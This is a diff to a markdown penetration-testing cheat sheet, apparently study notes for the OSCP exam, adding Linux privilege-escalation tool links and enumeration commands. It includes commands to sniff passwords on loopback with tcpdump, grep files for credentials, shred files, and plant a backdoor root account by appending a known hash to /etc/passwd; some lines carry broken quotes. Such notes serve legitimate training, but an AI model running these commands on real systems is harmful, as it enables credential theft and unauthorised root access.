@@ -800,84 +800,133 @@ exiftool *.pdf
 ```
 
 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+[ExplainShell](https://www.explainshell.com/)
+[CrackShadow](https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/)
+[linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+[LinEnum](https://github.com/rebootuser/LinEnum)
+[LinuxSmartEnum](https://github.com/diego-treitos/linux-smart-enumeration)
+[LinuxExploitSuggester](https://github.com/mzet-/linux-exploit-suggester)
+[GTFO-bins](https://gtfobins.github.io/)
+
 
 ### Linux Privilege Escalation
 
+_Linux Enumeration Commands_
+
 ```bash
-# Linux Enumeration Commands
+
+#list the name of the host/Display all network addresses of the host
+hostname -I 
+#
+uname -a
+cat /proc/version # prints almost same infor of above command but more like gcc version....
+cat /etc/crontab #Cron Jobs
+cat /etc/issue # exact version on the OS
+
+ps # lists the processes that are running
+  ps -A # all running processes
+  ps axjf # process tree
+  ps aux # displays processes with the users as well
+
+env # shows all the environment variable
+sudo -l # lists the commands that any user run as root without password
+groups # lists the groups that current user is in
+id # lists id of group,user
+
+cat /etc/passwd - displays all the user
+  cat /etc/passwd | cut -d ":" -f 1 # removes other stuff & only displays users
+  ls /home - displays users
+
+bash -p
+
+history - previously ran commands which might have some sensitive info
+ifconfig (or) ip a (or) ip route - network related information
+
+netstat - network route
+  netstat -a # all listening and established connection
+  netstat -at # tcp connections
+  netstat -au # udp connections
+  netstat -l # listening connections
+  netstat -s # network statistics
+  netstat -tp # connections with service name and pid we can also add "l" for only listening ports
+  netstat -i # interface related information
+  netstat -ano
+
+find command which helps us in finding lot of stuff,
+
+  Syntax: find <path> <options> <regex/name> find . -name flag1.txt # find the file named “flag1.txt” in the current directory
+  find /home -name flag1.txt # find the file names “flag1.txt” in the /home directory
+  find / -type d -name config # find the directory named config under “/”
+  find / -type f -perm 0777 # find files with the 777 permissions (files readable, writable, and executable by all users)
+  find / -perm a=x # find executable files
+  find /home -user frank # find all files for user “frank” under “/home”
+  find / -mtime 10 # find files that were modified in the last 10 days
+  find / -atime 10 # find files that were accessed in the last 10 day
+  find / -cmin -60 # find files changed within the last hour (60 minutes)
+  find / -amin -60 # find files accesses within the last hour (60 minutes)
+  find / -size 50M # find files with a 50 MB size
+  find / -writable -type d 2>/dev/null # Find world-writeable folders
+  find / -perm -222 -type d 2>/dev/null # Find world-writeable folders
+  find / -perm -o w -type d 2>/dev/null # Find world-writeable folders
+  find / -perm -o x -type d 2>/dev/null # Find world-executable folders
+  We can also find programming languages and supported languages: find / -name perl*, find / -name python*, find / -name gcc* ...etc
+  find / -perm -u=s -type f 2>/dev/null # Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. This is important!
 
 #Check commands you can execute with sudo
 sudo -l 
-
 #Check Group id
 id
-
 #Check folder permissions
 ls -la
-
 #Check root process
 ps -ef | grep root
-
 #Search write-able services
 ls -la $(find . -type s -writable 2>/dev/null) 
-
 #Search write-able files
 ls -la $(find . -type f -writable 2>/dev/null) 
-
+#delete file 
+shred -zun 10 -v file.php
 #Find all SUID binaries
 find / -perm -4000 2>/dev/null
 find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
 find / -user root -perm -4000 -print 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
-
 find / -writable -type d 2>/dev/null
-
 dpkg -l #Installed applications on debian system
 cat /etc/fstab #Listing mounted drives
 lsblk #Listing all available drives
 lsmod #Listing loaded drivers
-
+getcap -r / 2>/dev/null #Capabilities
 watch -n 1 "ps -aux | grep pass" #Checking processes for credentials
 sudo tcpdump -i lo -A | grep "pass" #Password sniffing using tcpdump
 
 # List All Users on a System
 cat /etc/passwd
-
 # Search Passwords
 grep -irE '(password|pwd|pass)[[:space:]]*=[[:space:]]*[[:alpha:]]+' * 2>/dev/null
-
 # List All Users on a System (cleaner, only users)
 awk –F’:‘ ’{ print $1}’ /etc/passwd
-
 # List All Logged in Users
 who | awk ‘{print $1}’ | sort | uniq | tr ‘\n’ ‘ ’
-
 # Find files modified < 1 day
 find . -mtime -1
 find / -mtime -1
-
 # Find files modified < 5 min
 find . -mmin -5
 find / -mmin -5
-
 # Find files within date range
 find / -newermt 2022-09-15 ! -newermt 2022-09-19 -type f 2>/dev/null 
-
 # Web files
 ls -alhR /var/www/ 2>/dev/null
 ls -alhR /srv/www/htdocs/ 2>/dev/null
 ls -alhR /usr/local/www/apache22/data/
 ls -alhR /opt/lampp/htdocs/ 2>/dev/null
-
 # Creating entry for /etc/passwd
 openssl passwd -1 -salt ignite pass123
 > $1$ignite$3eTbJm98O9Hz.k1NTdNxe1
-
 echo "temp:\$1\$ignite\$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash" >> /etc/passwd
-
 su temp
 pass pass123
-
 # OSCP Flag Proof
 cat /root/proof.txt && whoami && hostname && ip addr
 ```
